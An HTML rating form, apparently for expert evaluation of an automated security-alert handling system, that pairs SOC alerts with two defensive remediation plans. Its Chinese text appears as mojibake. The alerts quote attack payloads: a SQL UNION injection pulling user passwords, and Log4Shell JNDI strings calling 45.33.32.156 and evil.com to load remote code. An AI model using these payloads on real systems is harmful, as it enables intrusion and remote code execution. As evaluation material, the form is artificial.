<!DOCTYPE html>
<html lang="zh-CN">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>æ™ºèƒ½å‘Šè­¦å¤„ç½®ç³»ç»Ÿ - ä¸“å®¶åœ¨çº¿è¯„åˆ†è¡¨</title>
    <style>
        * {
            box-sizing: border-box;
        }
        
        body {
            font-family: "Microsoft YaHei", "SimHei", sans-serif;
            font-size: 14px;
            line-height: 1.6;
            color: #333;
            background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
            min-height: 100vh;
            margin: 0;
            padding: 20px;
        }
        
        .container {
            max-width: 1200px;
            margin: 0 auto;
            background: white;
            border-radius: 12px;
            box-shadow: 0 10px 40px rgba(0,0,0,0.2);
            overflow: hidden;
        }
        
        .header {
            background: linear-gradient(135deg, #1a5f7a 0%, #159895 100%);
            color: white;
            padding: 30px;
            text-align: center;
        }
        
        .header h1 {
            margin: 0;
            font-size: 24px;
        }
        
        .header p {
            margin: 10px 0 0;
            opacity: 0.9;
        }
        
        .progress-bar {
            background: rgba(255,255,255,0.3);
            height: 8px;
            border-radius: 4px;
            margin-top: 20px;
            overflow: hidden;
        }
        
        .progress-fill {
            background: #4ade80;
            height: 100%;
            width: 0%;
            transition: width 0.3s;
            border-radius: 4px;
        }
        
        .progress-text {
            margin-top: 8px;
            font-size: 13px;
        }
        
        .expert-info {
            background: #f8fafc;
            padding: 25px 30px;
            border-bottom: 1px solid #e2e8f0;
        }
        
        .expert-info h3 {
            margin: 0 0 15px;
            color: #1a5f7a;
        }
        
        .form-row {
            display: flex;
            gap: 20px;
            flex-wrap: wrap;
        }
        
        .form-group {
            flex: 1;
            min-width: 200px;
        }
        
        .form-group label {
            display: block;
            font-weight: bold;
            margin-bottom: 5px;
            color: #475569;
        }
        
        .form-group input, .form-group select {
            width: 100%;
            padding: 10px 12px;
            border: 2px solid #e2e8f0;
            border-radius: 8px;
            font-size: 14px;
            transition: border-color 0.2s;
        }
        
        .form-group input:focus, .form-group select:focus {
            outline: none;
            border-color: #1a5f7a;
        }
        
        .nav-tabs {
            display: flex;
            background: #f1f5f9;
            padding: 10px 10px 0;
            gap: 5px;
            overflow-x: auto;
        }
        
        .nav-tab {
            padding: 12px 20px;
            background: transparent;
            border: none;
            cursor: pointer;
            font-size: 13px;
            color: #64748b;
            border-radius: 8px 8px 0 0;
            transition: all 0.2s;
            white-space: nowrap;
        }
        
        .nav-tab:hover {
            background: rgba(255,255,255,0.5);
        }
        
        .nav-tab.active {
            background: white;
            color: #1a5f7a;
            font-weight: bold;
        }
        
        .nav-tab.completed {
            color: #16a34a;
        }
        
        .nav-tab.completed::after {
            content: " âœ“";
        }
        
        .case-panel {
            display: none;
            padding: 30px;
        }
        
        .case-panel.active {
            display: block;
        }
        
        .case-title {
            color: #1a5f7a;
            margin: 0 0 20px;
            padding-bottom: 10px;
            border-bottom: 2px solid #e2e8f0;
        }
        
        .alert-box {
            background: #fef3c7;
            border: 1px solid #f59e0b;
            border-left: 4px solid #f59e0b;
            border-radius: 8px;
            padding: 15px;
            margin-bottom: 25px;
        }
        
        .alert-box h4 {
            margin: 0 0 10px;
            color: #92400e;
        }
        
        .alert-content {
            background: #1e293b;
            color: #e2e8f0;
            padding: 15px;
            border-radius: 8px;
            font-family: "Consolas", monospace;
            font-size: 12px;
            white-space: pre-wrap;
            max-height: 200px;
            overflow-y: auto;
        }
        
        /* æ–¹æ¡ˆAå’ŒBä¸¤åˆ—å¹¶æ’å¸ƒå±€ */
        .solutions-container {
            display: grid;
            grid-template-columns: 1fr 1fr;
            gap: 20px;
            margin-bottom: 25px;
        }
        
        @media (max-width: 900px) {
            .solutions-container {
                grid-template-columns: 1fr;
            }
        }
        
        .solution-box {
            background: #f8fafc;
            border: 1px solid #e2e8f0;
            border-radius: 8px;
            overflow: hidden;
        }
        
        .solution-header {
            background: #e2e8f0;
            padding: 12px 15px;
            font-weight: bold;
            display: flex;
            align-items: center;
            gap: 10px;
        }
        
        .solution-header.plan-a {
            background: #fee2e2;
            color: #991b1b;
        }
        
        .solution-header.plan-b {
            background: #dbeafe;
            color: #1e40af;
        }
        
        .solution-content {
            padding: 15px;
            font-size: 13px;
            max-height: 350px;
            overflow-y: auto;
        }
        
        .solution-content pre {
            background: #f1f5f9;
            padding: 10px;
            border-radius: 6px;
            overflow-x: auto;
            white-space: pre-wrap;
            word-wrap: break-word;
            margin: 0;
        }
        
        /* æ»‘å—è¯„åˆ†æ ·å¼ */
        .slider-container {
            display: flex;
            align-items: center;
            gap: 10px;
        }
        
        .rating-slider {
            width: 120px;
            height: 8px;
            -webkit-appearance: none;
            appearance: none;
            background: linear-gradient(to right, #ef4444 0%, #eab308 50%, #22c55e 100%);
            border-radius: 4px;
            outline: none;
            cursor: pointer;
        }
        
        .rating-slider::-webkit-slider-thumb {
            -webkit-appearance: none;
            appearance: none;
            width: 20px;
            height: 20px;
            background: white;
            border: 3px solid #166534;
            border-radius: 50%;
            cursor: pointer;
            box-shadow: 0 2px 6px rgba(0,0,0,0.2);
        }
        
        .rating-slider::-moz-range-thumb {
            width: 20px;
            height: 20px;
            background: white;
            border: 3px solid #166534;
            border-radius: 50%;
            cursor: pointer;
            box-shadow: 0 2px 6px rgba(0,0,0,0.2);
        }
        
        .slider-value {
            min-width: 40px;
            text-align: center;
            font-weight: bold;
            font-size: 16px;
            color: #166534;
            background: #f0fdf4;
            padding: 4px 8px;
            border-radius: 4px;
            border: 1px solid #86efac;
        }
        
        .rating-section {
            background: #f0fdf4;
            border: 1px solid #86efac;
            border-radius: 8px;
            padding: 20px;
            margin-top: 25px;
        }
        
        .rating-section h4 {
            margin: 0 0 15px;
            color: #166534;
        }
        
        .rating-table {
            width: 100%;
            border-collapse: collapse;
        }
        
        .rating-table th, .rating-table td {
            padding: 12px;
            text-align: center;
            border: 1px solid #d1d5db;
        }
        
        .rating-table th {
            background: #166534;
            color: white;
        }
        
        .rating-table td:first-child {
            text-align: left;
            font-weight: bold;
            background: #f0fdf4;
        }
        
        .rating-select {
            width: 70px;
            padding: 8px;
            border: 2px solid #d1d5db;
            border-radius: 6px;
            font-size: 14px;
            cursor: pointer;
        }
        
        .rating-select:focus {
            border-color: #166534;
            outline: none;
        }
        
        .time-inputs {
            display: flex;
            gap: 20px;
            margin-top: 20px;
            flex-wrap: wrap;
        }
        
        .time-input {
            flex: 1;
            min-width: 150px;
        }
        
        .time-input label {
            display: block;
            font-size: 12px;
            color: #475569;
            margin-bottom: 5px;
        }
        
        .time-input input {
            width: 100%;
            padding: 10px;
            border: 2px solid #d1d5db;
            border-radius: 6px;
            font-size: 14px;
        }
        
        .judgment-section {
            margin-top: 20px;
            padding-top: 20px;
            border-top: 1px solid #d1d5db;
        }
        
        .radio-group {
            display: flex;
            gap: 20px;
            flex-wrap: wrap;
            margin-top: 10px;
        }
        
        .radio-option {
            display: flex;
            align-items: center;
            gap: 8px;
            cursor: pointer;
        }
        
        .radio-option input {
            width: 18px;
            height: 18px;
            cursor: pointer;
        }
        
        .comment-box {
            margin-top: 20px;
        }
        
        .comment-box textarea {
            width: 100%;
            height: 80px;
            padding: 12px;
            border: 2px solid #d1d5db;
            border-radius: 8px;
            font-size: 14px;
            resize: vertical;
        }
        
        .nav-buttons {
            display: flex;
            justify-content: space-between;
            margin-top: 30px;
            padding-top: 20px;
            border-top: 1px solid #e2e8f0;
        }
        
        .btn {
            padding: 12px 30px;
            border: none;
            border-radius: 8px;
            font-size: 14px;
            cursor: pointer;
            transition: all 0.2s;
        }
        
        .btn-secondary {
            background: #e2e8f0;
            color: #475569;
        }
        
        .btn-secondary:hover {
            background: #cbd5e1;
        }
        
        .btn-primary {
            background: linear-gradient(135deg, #1a5f7a 0%, #159895 100%);
            color: white;
        }
        
        .btn-primary:hover {
            transform: translateY(-2px);
            box-shadow: 0 4px 12px rgba(26,95,122,0.3);
        }
        
        .btn-success {
            background: linear-gradient(135deg, #16a34a 0%, #22c55e 100%);
            color: white;
        }
        
        .btn-success:hover {
            transform: translateY(-2px);
            box-shadow: 0 4px 12px rgba(22,163,74,0.3);
        }
        
        .export-section {
            background: #fef3c7;
            padding: 30px;
            text-align: center;
            display: none;
        }
        
        .export-section.show {
            display: block;
        }
        
        .export-section h3 {
            color: #92400e;
            margin: 0 0 15px;
        }
        
        .export-buttons {
            display: flex;
            gap: 15px;
            justify-content: center;
            flex-wrap: wrap;
        }
        
        .data-preview {
            background: #1e293b;
            color: #4ade80;
            padding: 15px;
            border-radius: 8px;
            text-align: left;
            font-family: monospace;
            font-size: 12px;
            max-height: 200px;
            overflow: auto;
            margin-top: 20px;
        }

        .tooltip {
            position: relative;
            cursor: help;
        }
        
        .tooltip::after {
            content: attr(data-tip);
            position: absolute;
            bottom: 100%;
            left: 50%;
            transform: translateX(-50%);
            background: #1e293b;
            color: white;
            padding: 8px 12px;
            border-radius: 6px;
            font-size: 12px;
            white-space: nowrap;
            opacity: 0;
            pointer-events: none;
            transition: opacity 0.2s;
        }
        
        .tooltip:hover::after {
            opacity: 1;
        }
    </style>
</head>
<body>
    <div class="container">
        <div class="header">
            <h1>ğŸ” æ™ºèƒ½å‘Šè­¦å¤„ç½®ç³»ç»Ÿ - ä¸“å®¶è¯„ä¼°</h1>
            <p>è¯·å¯¹æ¯”ä¸¤ä¸ªå¤„ç½®æ–¹æ¡ˆï¼Œç‹¬ç«‹å®Œæˆè¯„åˆ†</p>
            <div class="progress-bar">
                <div class="progress-fill" id="progressFill"></div>
            </div>
            <div class="progress-text">å®Œæˆè¿›åº¦: <span id="progressText">0/6</span></div>
        </div>
        
        <div class="expert-info">
            <h3>ğŸ“‹ ä¸“å®¶ä¿¡æ¯</h3>
            <div class="form-row">
                <div class="form-group">
                    <label>å§“å *</label>
                    <input type="text" id="expertName" placeholder="è¯·è¾“å…¥æ‚¨çš„å§“å" required>
                </div>
                <div class="form-group">
                    <label>èŒä½/èƒŒæ™¯ *</label>
                    <input type="text" id="expertRole" placeholder="å¦‚ï¼šå®‰å…¨åˆ†æå¸ˆã€SOCè¿è¥">
                </div>
                <div class="form-group">
                    <label>è¯„ä¼°æ—¥æœŸ</label>
                    <input type="date" id="evalDate" value="2025-12-04">
                </div>
            </div>
        </div>
        
        <div class="nav-tabs" id="navTabs">
            <button class="nav-tab" data-case="1" onclick="switchCase(1)">Case01_SQLæ³¨å…¥</button>
<button class="nav-tab" data-case="2" onclick="switchCase(2)">Case05_Log4j_RCE</button>
<button class="nav-tab" data-case="3" onclick="switchCase(3)">Case07_ç›®å½•éå†</button>
<button class="nav-tab" data-case="4" onclick="switchCase(4)">Case12_DirtyPipeææƒ</button>
<button class="nav-tab" data-case="5" onclick="switchCase(5)">Case17_æ¼æ´æ‰«æ</button>
<button class="nav-tab" data-case="6" onclick="switchCase(6)">Case20_å¼±å¯†ç </button>

        </div>
        
        
<div class="case-panel" id="case-1">
    <h2 class="case-title">ğŸ“‹ æ¡ˆä¾‹ #1: Case01_SQLæ³¨å…¥</h2>
    
    <div class="alert-box">
        <h4>ğŸš¨ åŸå§‹å‘Šè­¦ä¿¡æ¯</h4>
        <div class="alert-content">ã€å‘Šè­¦åç§°ã€‘SQLæ³¨å…¥æ”»å‡»æ£€æµ‹
ã€å‘Šè­¦æ—¶é—´ã€‘2025-12-04 10:15:00
ã€æ”»å‡»æºIPã€‘203.0.113.45
ã€ç›®æ ‡IPã€‘192.168.1.100
ã€ç›®æ ‡ç«¯å£ã€‘80
ã€å¨èƒç­‰çº§ã€‘é«˜å±
ã€æ”»å‡»ç±»å‹ã€‘SQLæ³¨å…¥
ã€æ¼æ´ç±»å‹ã€‘CVE-2024-21732
ã€ATT&amp;CKã€‘åˆå§‹è®¿é—®:TA0001|åˆ©ç”¨é¢å‘å…¬ä¼—çš„åº”ç”¨:T1190
ã€è¯·æ±‚URIã€‘/api/user/search?id=1
ã€Payloadã€‘id=1' UNION SELECT username,password,email FROM users--
ã€å‘Šè­¦æè¿°ã€‘æ£€æµ‹åˆ°æ¥è‡ª203.0.113.45çš„SQLæ³¨å…¥æ”»å‡»ï¼Œæ”»å‡»è€…å°è¯•é€šè¿‡è”åˆæŸ¥è¯¢è·å–ç”¨æˆ·è¡¨ä¸­çš„æ•æ„Ÿæ•°æ®ï¼ŒåŒ…æ‹¬ç”¨æˆ·åã€å¯†ç å’Œé‚®ç®±ä¿¡æ¯ã€‚
ã€å¤„ç½®å»ºè®®ã€‘å»ºè®®å°ç¦æ”»å‡»æºIPï¼Œä¿®å¤SQLæ³¨å…¥æ¼æ´ï¼Œå¯¹ç”¨æˆ·è¾“å…¥è¿›è¡Œå‚æ•°åŒ–æŸ¥è¯¢</div>
    </div>
    
    <div class="solutions-container">
        <div class="solution-box">
            <div class="solution-header plan-a">ğŸ…°ï¸ æ–¹æ¡ˆA</div>
            <div class="solution-content"><pre>ã€å¤„ç½®æ–¹æ¡ˆã€‘
1. ä¸´æ—¶å°ç¦æ”»å‡»æºIP 203.0.113.45
   - ä½¿ç”¨iptableså‘½ä»¤ï¼šiptables -A INPUT -s 203.0.113.45 -j DROP
2. æ£€æŸ¥ç›®æ ‡Webåº”ç”¨ï¼ˆ192.168.1.100:80ï¼‰æ˜¯å¦å­˜åœ¨SQLæ³¨å…¥æ¼æ´ï¼Œé‡ç‚¹æ’æŸ¥ /api/user/search æ¥å£
3. å»ºè®®å¼€å‘å›¢é˜Ÿå¯¹ç›¸å…³æ¥å£å¢åŠ å‚æ•°åŒ–æŸ¥è¯¢ï¼Œé¿å…æ‹¼æ¥SQLè¯­å¥
4. åç»­å»ºè®®å¯¹ç”¨æˆ·è¡¨æ•æ„Ÿå­—æ®µåŠ å¯†å­˜å‚¨ï¼Œæå‡å®‰å…¨æ€§

ã€æç¤ºã€‘
- å°ç¦IPå‰ï¼Œå¯ç”¨iptables-saveå¤‡ä»½ç­–ç•¥ï¼ˆå‘½ä»¤ï¼šiptables-save &gt; /root/iptables-backup-$(date +%F).confï¼‰
- æ­¤å¤„å°ç¦ä¸ºä¸´æ—¶æªæ–½ï¼Œå»ºè®®æ ¹æœ¬ä¿®å¤ä»£ç æ¼æ´</pre></div>
        </div>
        
        <div class="solution-box">
            <div class="solution-header plan-b">ğŸ…±ï¸ æ–¹æ¡ˆB</div>
            <div class="solution-content"><pre>ã€è‡ªåŠ¨å¤„ç½®Playbookã€‘
1. å…³è”CVE-2024-21732åˆ†æä¸è¡¥ä¸æ–¹æ¡ˆï¼Œç¡®è®¤å—å½±å“çš„åº”ç”¨åŠç‰ˆæœ¬ï¼ˆè¯¦è§NVD: https://nvd.nist.gov/vuln/detail/CVE-2024-21732ï¼‰
2. ç”Ÿæˆå°ç¦å‘½ä»¤ï¼ˆå«å›é€€ä¸æ£€æŸ¥ï¼‰ï¼š
   - é¢„æ£€æŸ¥ï¼š
     iptables -C INPUT -s 203.0.113.45 -j DROP &amp;&amp; echo "IPå·²å°ç¦" || echo "æœªå°ç¦"
   - å°ç¦å‘½ä»¤ï¼š
     iptables -I INPUT -s 203.0.113.45 -j DROP
   - å›é€€å‘½ä»¤ï¼ˆè§£å°ï¼‰ï¼š
     iptables -D INPUT -s 203.0.113.45 -j DROP
   - å¤‡ä»½é˜²ç«å¢™è§„åˆ™ï¼š
     iptables-save &gt; /root/iptables-backup-$(date +%F).conf
3. å…³è”ATT&amp;CKç¼–å·åˆå§‹è®¿é—®:TA0001ã€åˆ©ç”¨é¢å‘å…¬ä¼—çš„åº”ç”¨:T1190ï¼Œå»ºè®®è¯„ä¼°ç³»ç»Ÿæ˜¯å¦æš´éœ²å…¶ä»–åº”ç”¨æ¥å£
4. é’ˆå¯¹/api/user/searchæ¥å£ï¼Œå»ºè®®:
   - å¼ºåˆ¶å‚æ•°åŒ–æŸ¥è¯¢æˆ–ä½¿ç”¨ORM
   - å®¡è®¡è¿‘æœŸæ•°æ®åº“è®¿é—®æ—¥å¿—
   - éªŒè¯WAFã€RASPæ˜¯å¦å¯ç”¨
5. DevOpsæµç¨‹å»ºè®®ï¼š
   - ç«‹å³æ¨é€CVE-2024-21732è¡¥ä¸
   - æ’æŸ¥æ˜“å—å½±å“çš„API endpoints

ã€ç»“æ„åŒ–è¯æ®ã€‘
- æºIP: 203.0.113.45
- ç›®æ ‡IP: 192.168.1.100
- æ”»å‡»ç±»å‹: SQLæ³¨å…¥ï¼ˆè”åˆæŸ¥è¯¢ï¼‰
- å…³è”: CVE-2024-21732ã€ATT&amp;CK T1190

ã€æ³¨æ„äº‹é¡¹ã€‘
- å°ç¦IPåéœ€ç›‘æµ‹ä»£ç†é‡è¯•
- æ‰§è¡Œå‰åšå¥½å›é€€ä¸å˜æ›´å®¡æ‰¹</pre></div>
        </div>
    </div>
    
    <div class="rating-section">
        <h4>ğŸ“Š è¯„åˆ†ï¼ˆ1.0-5.0åˆ†ï¼Œ5åˆ†æœ€é«˜ï¼Œæ”¯æŒå°æ•°å¦‚4.9ï¼‰</h4>
        <table class="rating-table">
            <thead>
                <tr>
                    <th>è¯„ä¼°ç»´åº¦</th>
                    <th>æ–¹æ¡ˆA</th>
                    <th>æ–¹æ¡ˆB</th>
                </tr>
            </thead>
            <tbody>
                <tr>
                    <td class="tooltip" data-tip="ç²¾å‡†è¯†åˆ«æ”»å‡»ç±»å‹ï¼Œå®ä½“æå–æ— è¯¯">æ„å›¾ç†è§£ (25%)</td>
                    <td><div class="slider-container"><input type="range" class="rating-slider" name="planA_intent" min="1" max="5" step="0.1" value="3" oninput="this.nextElementSibling.textContent=this.value"><span class="slider-value">3.0</span></div></td>
                    <td><div class="slider-container"><input type="range" class="rating-slider" name="planB_intent" min="1" max="5" step="0.1" value="3" oninput="this.nextElementSibling.textContent=this.value"><span class="slider-value">3.0</span></div></td>
                </tr>
                <tr>
                    <td class="tooltip" data-tip="CVE+ATT&CK+IOCå®Œæ•´å…³è”">è¯æ®é“¾å®Œæ•´æ€§ (25%)</td>
                    <td><div class="slider-container"><input type="range" class="rating-slider" name="planA_evidence" min="1" max="5" step="0.1" value="3" oninput="this.nextElementSibling.textContent=this.value"><span class="slider-value">3.0</span></div></td>
                    <td><div class="slider-container"><input type="range" class="rating-slider" name="planB_evidence" min="1" max="5" step="0.1" value="3" oninput="this.nextElementSibling.textContent=this.value"><span class="slider-value">3.0</span></div></td>
                </tr>
                <tr>
                    <td class="tooltip" data-tip="å…·ä½“å‘½ä»¤å¯ç›´æ¥æ‰§è¡Œ">Playbookå¯æ‰§è¡Œæ€§ (30%)</td>
                    <td><div class="slider-container"><input type="range" class="rating-slider" name="planA_playbook" min="1" max="5" step="0.1" value="3" oninput="this.nextElementSibling.textContent=this.value"><span class="slider-value">3.0</span></div></td>
                    <td><div class="slider-container"><input type="range" class="rating-slider" name="planB_playbook" min="1" max="5" step="0.1" value="3" oninput="this.nextElementSibling.textContent=this.value"><span class="slider-value">3.0</span></div></td>
                </tr>
                <tr>
                    <td class="tooltip" data-tip="æœ‰å›é€€å‘½ä»¤å’Œæ‰§è¡Œå‰æ£€æŸ¥">ä¸šåŠ¡å®‰å…¨æ€§ (20%)</td>
                    <td><div class="slider-container"><input type="range" class="rating-slider" name="planA_safety" min="1" max="5" step="0.1" value="3" oninput="this.nextElementSibling.textContent=this.value"><span class="slider-value">3.0</span></div></td>
                    <td><div class="slider-container"><input type="range" class="rating-slider" name="planB_safety" min="1" max="5" step="0.1" value="3" oninput="this.nextElementSibling.textContent=this.value"><span class="slider-value">3.0</span></div></td>
                </tr>
            </tbody>
        </table>
        
        <div class="time-inputs">
            <div class="time-input">
                <label>å®Œå…¨äººå·¥å¤„ç†é¢„è®¡è€—æ—¶ï¼ˆåˆ†é’Ÿï¼‰</label>
                <input type="number" name="manualTime" min="1" max="120" placeholder="å¦‚ï¼š15">
            </div>
            <div class="time-input">
                <label>å®¡æ ¸æ–¹æ¡ˆAè€—æ—¶ï¼ˆåˆ†é’Ÿï¼‰</label>
                <input type="number" name="reviewA" min="1" max="60" placeholder="å¦‚ï¼š8">
            </div>
            <div class="time-input">
                <label>å®¡æ ¸æ–¹æ¡ˆBè€—æ—¶ï¼ˆåˆ†é’Ÿï¼‰</label>
                <input type="number" name="reviewB" min="1" max="60" placeholder="å¦‚ï¼š3">
            </div>
        </div>
        
        <div class="judgment-section">
            <label><strong>å“ªä¸ªæ–¹æ¡ˆæ›´å¥½ï¼Ÿ</strong></label>
            <div class="radio-group">
                <label class="radio-option"><input type="radio" name="better" value="A"> æ–¹æ¡ˆAæ›´å¥½</label>
                <label class="radio-option"><input type="radio" name="better" value="B"> æ–¹æ¡ˆBæ›´å¥½</label>
                <label class="radio-option"><input type="radio" name="better" value="equal"> å·®ä¸å¤š</label>
            </div>
        </div>
        
        <div class="judgment-section">
            <label><strong>æ–¹æ¡ˆAå¯é‡‡çº³ç¨‹åº¦ï¼š</strong></label>
            <div class="radio-group">
                <label class="radio-option"><input type="radio" name="adoptA" value="direct"> å¯ç›´æ¥é‡‡çº³</label>
                <label class="radio-option"><input type="radio" name="adoptA" value="minor"> éœ€å°‘é‡ä¿®æ”¹</label>
                <label class="radio-option"><input type="radio" name="adoptA" value="major"> éœ€å¤§é‡ä¿®æ”¹</label>
                <label class="radio-option"><input type="radio" name="adoptA" value="unusable"> ä¸å¯ç”¨</label>
            </div>
        </div>
        
        <div class="judgment-section">
            <label><strong>æ–¹æ¡ˆBå¯é‡‡çº³ç¨‹åº¦ï¼š</strong></label>
            <div class="radio-group">
                <label class="radio-option"><input type="radio" name="adoptB" value="direct"> å¯ç›´æ¥é‡‡çº³</label>
                <label class="radio-option"><input type="radio" name="adoptB" value="minor"> éœ€å°‘é‡ä¿®æ”¹</label>
                <label class="radio-option"><input type="radio" name="adoptB" value="major"> éœ€å¤§é‡ä¿®æ”¹</label>
                <label class="radio-option"><input type="radio" name="adoptB" value="unusable"> ä¸å¯ç”¨</label>
            </div>
        </div>
        
        <div class="comment-box">
            <label><strong>æ–¹æ¡ˆAè¯„ä»·ï¼ˆå¯é€‰ï¼‰ï¼š</strong></label>
            <textarea name="commentA" placeholder="ä¼˜ç‚¹/ç¼ºç‚¹/æ”¹è¿›å»ºè®®..."></textarea>
        </div>
        
        <div class="comment-box">
            <label><strong>æ–¹æ¡ˆBè¯„ä»·ï¼ˆå¯é€‰ï¼‰ï¼š</strong></label>
            <textarea name="commentB" placeholder="ä¼˜ç‚¹/ç¼ºç‚¹/æ”¹è¿›å»ºè®®..."></textarea>
        </div>
    </div>
    
    <div class="nav-buttons">
        <button class="btn btn-secondary" onclick="prevCase(1)" disabled style="opacity:0.5">â† ä¸Šä¸€ä¸ª</button>
        <button class="btn btn-primary" onclick="nextCase(1)">ä¸‹ä¸€ä¸ª â†’</button>
    </div>
</div>

<div class="case-panel" id="case-2">
    <h2 class="case-title">ğŸ“‹ æ¡ˆä¾‹ #2: Case05_Log4j_RCE</h2>
    
    <div class="alert-box">
        <h4>ğŸš¨ åŸå§‹å‘Šè­¦ä¿¡æ¯</h4>
        <div class="alert-content">ã€å‘Šè­¦åç§°ã€‘Log4jè¿œç¨‹ä»£ç æ‰§è¡Œæ”»å‡»
ã€å‘Šè­¦æ—¶é—´ã€‘2025-12-04 12:00:00
ã€æ”»å‡»æºIPã€‘45.33.32.156
ã€ç›®æ ‡IPã€‘10.0.0.50
ã€ç›®æ ‡ç«¯å£ã€‘8080
ã€å¨èƒç­‰çº§ã€‘ä¸¥é‡
ã€æ”»å‡»ç±»å‹ã€‘å‘½ä»¤æ‰§è¡Œ/RCE
ã€æ¼æ´ç±»å‹ã€‘CVE-2021-44228
ã€ATT&amp;CKã€‘æ‰§è¡Œ:TA0002|åˆ©ç”¨åº”ç”¨ç¨‹åºæ¼æ´:T1203
ã€è¯·æ±‚URIã€‘/api/login
ã€Payloadã€‘${jndi:ldap://45.33.32.156:1389/Exploit}
ã€User-Agentã€‘${jndi:ldap://evil.com/a}
ã€å‘Šè­¦æè¿°ã€‘æ£€æµ‹åˆ°Log4j JNDIæ³¨å…¥æ”»å‡»ï¼ˆLog4Shellï¼‰ï¼Œæ”»å‡»è€…åœ¨User-Agentå’Œè¯·æ±‚å‚æ•°ä¸­æ³¨å…¥JNDI Lookupè¡¨è¾¾å¼ï¼Œå°è¯•ä»è¿œç¨‹æœåŠ¡å™¨åŠ è½½æ¶æ„ç±»æ‰§è¡Œä»»æ„ä»£ç ã€‚
ã€å¤„ç½®å»ºè®®ã€‘ç«‹å³å‡çº§Log4jåˆ°2.17.0+ï¼Œä¸´æ—¶ç¼“è§£å¯è®¾ç½®log4j2.formatMsgNoLookups=true</div>
    </div>
    
    <div class="solutions-container">
        <div class="solution-box">
            <div class="solution-header plan-a">ğŸ…°ï¸ æ–¹æ¡ˆA</div>
            <div class="solution-content"><pre>å¤„ç½®æªæ–½ï¼š
1. å»ºè®®ç«‹å³å‡çº§Log4jè‡³2.17.0æˆ–ä»¥ä¸Šç‰ˆæœ¬ï¼Œä¿®å¤CVE-2021-44228æ¼æ´ã€‚
2. å¦‚æ— æ³•ç«‹å³å‡çº§ï¼Œè¯·åœ¨jvmå¯åŠ¨å‚æ•°ä¸­æ·»åŠ -Dlog4j2.formatMsgNoLookups=trueä½œä¸ºä¸´æ—¶ç¼“è§£æªæ–½ã€‚
3. æ£€æŸ¥æœåŠ¡å™¨10.0.0.50å’Œç›¸å…³åº”ç”¨æ—¥å¿—ï¼Œç¡®è®¤æ˜¯å¦å­˜åœ¨å¼‚å¸¸è¯·æ±‚æˆ–åå‘è¿æ¥ã€‚
4. å°ç¦æ”»å‡»æºIPï¼ˆ45.33.32.156ï¼‰ï¼š
   - Linuxé˜²ç«å¢™å‘½ä»¤ï¼š
     iptables -A INPUT -s 45.33.32.156 -j DROP
5. å»ºè®®å…³æ³¨å®˜æ–¹å®‰å…¨å…¬å‘Šï¼ŒæŒç»­æ›´æ–°å®‰å…¨è¡¥ä¸ã€‚

å‚è€ƒä¿¡æ¯ï¼š
- CVE-2021-44228: https://nvd.nist.gov/vuln/detail/CVE-2021-44228</pre></div>
        </div>
        
        <div class="solution-box">
            <div class="solution-header plan-b">ğŸ…±ï¸ æ–¹æ¡ˆB</div>
            <div class="solution-content"><pre>å¤„ç½®æ–¹æ¡ˆï¼š
1. **ç«‹å³å¤„ç½®æªæ–½ï¼š**
   - ä¸´æ—¶é˜»æ–­æ”»å‡»æºIPï¼š
     ```bash
     iptables -I INPUT -s 45.33.32.156 -j DROP
     ```
     - å›é€€ï¼ˆæ’¤é”€ï¼‰å‘½ä»¤ï¼š
     ```bash
     iptables -D INPUT -s 45.33.32.156 -j DROP
     ```
     - ç”Ÿæ•ˆæ£€æŸ¥ï¼š
     ```bash
     iptables -L INPUT -n | grep 45.33.32.156
     ```

2. **æ¼æ´ä¿®å¤å»ºè®®ï¼š**
   - ç«‹å³å‡çº§Log4jè‡³2.17.0æˆ–æ›´é«˜ï¼ˆCVE-2021-44228ï¼‰ã€‚
   - å¦‚æ— æ³•ç«‹å³å‡çº§ï¼Œæ·»åŠ JVMå¯åŠ¨å‚æ•°ç¼“è§£ï¼ˆéœ€é‡å¯åº”ç”¨ï¼‰ï¼š
     - Linuxé…ç½®ç¤ºä¾‹ï¼ˆç¼–è¾‘å¯åŠ¨è„šæœ¬æˆ–æœåŠ¡ï¼‰ï¼š
       ```bash
       export JAVA_OPTS="$JAVA_OPTS -Dlog4j2.formatMsgNoLookups=true"
       ```
   - æŸ¥çœ‹å½“å‰Log4jç‰ˆæœ¬ä¸JVMå‚æ•°å‘½ä»¤ï¼š
     ```bash
     find / -name "log4j*.jar"
     java -jar log4j-core-*.jar --version
     ps aux | grep java
     ```

3. **æ—¥å¿—å’Œå¨èƒæº¯æºï¼š**
   - æ£€æŸ¥10.0.0.50:/var/log/åŠåº”ç”¨æ—¥å¿—ï¼Œç¡®è®¤æ˜¯å¦å·²å»ºç«‹æ¶æ„è¿æ¥ï¼š
     ```bash
     grep -ni 'jndi' /var/log/* 2>/dev/null
     netstat -anp | grep 1389
     ```

4. **æƒ…æŠ¥å…³è”ï¼š**
   - CVE: CVE-2021-44228
   - ATT&CK: TA0002ï¼ˆæ‰§è¡Œï¼‰ã€T1203ï¼ˆåˆ©ç”¨åº”ç”¨ç¨‹åºæ¼æ´ï¼‰
   - IOC:
     - æ”»å‡»æºIP: 45.33.32.156
     - æ¶æ„Payload: ${jndi:ldap://45.33.32.156:1389/Exploit}

5. **ä¸šåŠ¡å®‰å…¨æç¤ºï¼š**
   - æ“ä½œå‰å»ºè®®å¤‡ä»½åº”ç”¨é…ç½®å’Œå…³é”®æ•°æ®ã€‚
   - æ‰§è¡Œå‘½ä»¤é¡»ç¡®å®šå…¼å®¹å½“å‰ç”Ÿäº§ç¯å¢ƒï¼Œæˆ–å…ˆåœ¨æµ‹è¯•ç¯å¢ƒéªŒè¯ã€‚
   - æ“ä½œå¸¦æ¥çš„è®¿é—®é™åˆ¶åŠæ—¶ä¸ä¸šåŠ¡å›¢é˜Ÿæ²Ÿé€šã€‚

å‚è€ƒé“¾æ¥ï¼š
- [CVE-2021-44228](https://nvd.nist.gov/vuln/detail/CVE-2021-44228)
- [å®˜æ–¹å‡çº§æŒ‡å—](https://logging.apache.org/log4j/2.x/security.html)</pre></div>
        </div>
    </div>
    
    <div class="rating-section">
        <h4>ğŸ“Š è¯„åˆ†ï¼ˆ1.0-5.0åˆ†ï¼Œ5åˆ†æœ€é«˜ï¼Œæ”¯æŒå°æ•°å¦‚4.9ï¼‰</h4>
        <table class="rating-table">
            <thead>
                <tr>
                    <th>è¯„ä¼°ç»´åº¦</th>
                    <th>æ–¹æ¡ˆA</th>
                    <th>æ–¹æ¡ˆB</th>
                </tr>
            </thead>
            <tbody>
                <tr>
